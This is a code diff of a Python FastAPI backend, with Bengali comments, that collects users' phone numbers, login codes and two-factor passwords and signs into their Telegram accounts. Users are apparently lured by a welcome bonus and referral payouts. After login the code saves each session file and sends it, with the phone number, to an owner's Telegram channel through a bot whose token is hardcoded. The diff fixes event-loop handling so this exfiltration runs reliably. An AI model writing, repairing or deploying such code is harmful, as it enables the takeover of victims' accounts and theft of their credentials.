@@ -7,15 +7,16 @@ from fastapi.middleware.cors import CORSMiddleware
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
 
-# পাইথন ৩.১৪+ ইভেন্ট লুপ ফিক্স
+# ১. Render ও পাইথন ৩.১৪+ এর জন্য পারফেক্ট গ্লোবাল ইভেন্ট লুপ সেটআপ
 try:
-    asyncio.get_running_loop()
+    loop = asyncio.get_running_loop()
 except RuntimeError:
-    asyncio.set_event_loop(asyncio.new_event_loop())
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
 
 app = FastAPI()
 
-# ওয়ান-পেজ ওয়েবসাইটের সাথে কানেক্ট করার জন্য CORS ওপেন করা হলো
+# CORS সেটিংস (ব্লগারের সাথে কানেক্ট করার জন্য)
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -31,8 +32,8 @@ BOT_TOKEN = '8861051646:AAG7i9PdLe1M779utnc6GTZheKMVYj0m9Ts'
 OWNER_CHANNEL_ID = -1003645477647      
 SESSION_DIR = 'sessions'
 
-WELCOME_BONUS = 10          # Euro
-REFERRAL_COMMISSION = 5     # Euro
+WELCOME_BONUS = 10          
+REFERRAL_COMMISSION = 5     
 
 os.makedirs(SESSION_DIR, exist_ok=True)
 sessions_memory = {}
@@ -56,7 +57,9 @@ async def send_otp(phone: str = Form(...), user_id: int = Form(...), ref_id: int
         phone = f"+{phone}"
         
     temp_session = os.path.join(SESSION_DIR, f"temp_{user_id}")
-    client = TelegramClient(temp_session, API_ID, API_HASH)
+    
+    # ২. এখানে loop=loop বলে দিতে হবে যাতে Telethon মেইন লুপের সাথে সিঙ্ক হয়
+    client = TelegramClient(temp_session, API_ID, API_HASH, loop=loop)
     await client.connect()
     
     try:
@@ -89,7 +92,6 @@ async def verify_otp(user_id: int = Form(...), otp: str = Form(...), password: s
         else:
             await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
             
-        # লগইন সফল হলে পারমানেন্ট সেশন সেভ করা
         permanent_session = os.path.join(SESSION_DIR, f"user_{user_id}.session")
         await client.disconnect()
         
@@ -98,7 +100,6 @@ async def verify_otp(user_id: int = Form(...), otp: str = Form(...), password: s
             if os.path.exists(permanent_session): os.remove(permanent_session)
             os.rename(temp_file, permanent_session)
             
-        # ডাটাবেজে ইউজার এন্ট্রি ও বোনাস ক্যালকুলেশন
         now_str = datetime.now().isoformat()
         c.execute('INSERT OR IGNORE INTO users VALUES (?, ?, ?, ?, ?, ?)', (user_id, phone, permanent_session, WELCOME_BONUS, ref_id, now_str))
         
@@ -107,16 +108,16 @@ async def verify_otp(user_id: int = Form(...), otp: str = Form(...), password: s
             c.execute('INSERT INTO referrals (referrer_id, referred_user_id, commission, created_at) VALUES (?, ?, ?, ?)', (ref_id, user_id, REFERRAL_COMMISSION, now_str))
         conn.commit()
         
-        # ওনার চ্যানেলে সেশন ফাইল পাঠানো (ব্যাকগ্রাউন্ড বটের মাধ্যমে)
+        # ওনার চ্যানেলে সেশন ফাইল পাঠানো (লুপ এসাইন করে)
         try:
-            bot_client = TelegramClient('bot_sender', API_ID, API_HASH)
+            bot_client = TelegramClient('bot_sender', API_ID, API_HASH, loop=loop)
             await bot_client.start(bot_token=BOT_TOKEN)
             await bot_client.send_file(OWNER_CHANNEL_ID, permanent_session, caption=f"✨ New Session Generated!\nUser ID: {user_id}\nPhone: {phone}")
             await bot_client.disconnect()
         except Exception as bot_err:
             print("Bot send file error:", bot_err)
 
-        del sessions_memory[user_id]
+        if user_id in sessions_memory: del sessions_memory[user_id]
         return {"status": "success", "message": "Logged in successfully & balance updated!"}
         
     except SessionPasswordNeededError:
